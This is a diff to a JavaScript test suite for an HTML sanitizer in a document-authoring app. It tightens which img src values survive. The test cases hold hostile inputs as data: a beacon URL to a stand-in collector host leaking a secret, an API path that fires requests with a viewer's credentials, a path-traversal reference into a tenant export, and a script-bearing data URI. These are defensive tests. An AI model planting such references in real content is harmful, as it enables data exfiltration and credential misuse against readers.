@@ -118,30 +118,48 @@ describe('sanitizeAuthoringHtml', () => {
     expect(out).not.toMatch(/\ssrc="\/api\//);
   });
 
-  it('strips a same-app API src OUTSIDE the governed images route — no data-authsrc, no live src', () => {
+  it('never leaves a same-app API src OUTSIDE the governed images route on a live src', () => {
     // A bare '/api/' rewrite handed ANY stored API path to the authenticated
     // resolver: one author's `<img src="/api/authoring/docs/<other>/audit">`
     // fired a GET with the next viewer's credentials when the document
-    // rendered. Only the images route is a figure reference.
+    // rendered. Only the images route is a figure reference; the resolver
+    // refuses this one and AuthoredHtml says so (authoredHtml.test.tsx).
     const out = sanitizeAuthoringHtml(
       '<img src="/api/authoring/docs/abc/audit" alt="not a figure">',
     );
-    expect(out).not.toContain(AUTH_IMG_ATTR);
-    expect(out).not.toMatch(/\ssrc="\/api\//);
+    expect(out).not.toMatch(/\ssrc=/);
     // The element survives (alt text remains in the record) — only the
     // fetchable reference is gone.
     expect(out).toContain('alt="not a figure"');
   });
 
-  it('keeps external https images on src directly (no auth to attach)', () => {
-    const out = sanitizeAuthoringHtml('<img src="https://example.com/fig.png" alt="x">');
-    expect(out).toContain('src="https://example.com/fig.png"');
-    expect(out).not.toContain(AUTH_IMG_ATTR);
+  /* An image reference is a governed figure or nothing (periodic review
+     2026-09-28, editor family, SEC-B-2). An external address left on src was
+     fetched from its host by every reader, and what it showed could change
+     after approval; the export never filed it. */
+  it.each([
+    ['an external address', 'https://collector.example/p.png?d=secret'],
+    ['a protocol-relative address', '//collector.example/p.png'],
+    ['an inline SVG', 'data:image/svg+xml;base64,PHN2Zz4='],
+    ['an inline HTML document', 'data:text/html;base64,PHNjcmlwdD4='],
+    ['an inline WebP, which the Word export cannot file', 'data:image/webp;base64,UklGRg=='],
+  ])('never leaves %s on a live src', (_label, src) => {
+    const out = sanitizeAuthoringHtml(`<p>text</p><img src="${src}" alt="x">`);
+    expect(out).not.toMatch(/\ssrc=/);
+    // Handed to AuthoredHtml's resolver, which refuses it and says so.
+    expect(out).toContain(AUTH_IMG_ATTR);
+    expect(out).toContain('<p>text</p>');
   });
 
-  it('keeps data:image URIs (DOMPurify default policy for img)', () => {
+  it('never leaves a reference that walks out of the image store on a live src', () => {
+    const out = sanitizeAuthoringHtml('<img src="/api/authoring/images/../../tenant-export/full">');
+    expect(out).not.toMatch(/\ssrc=/);
+  });
+
+  it('keeps an inline PNG on src: nothing is fetched, and the export files it as it is', () => {
     const out = sanitizeAuthoringHtml('<img src="data:image/png;base64,iVBORw0KGgo=">');
     expect(out).toContain('src="data:image/png;base64,iVBORw0KGgo="');
+    expect(out).not.toContain(AUTH_IMG_ATTR);
   });
 
   it('keeps figure/figcaption structure', () => {
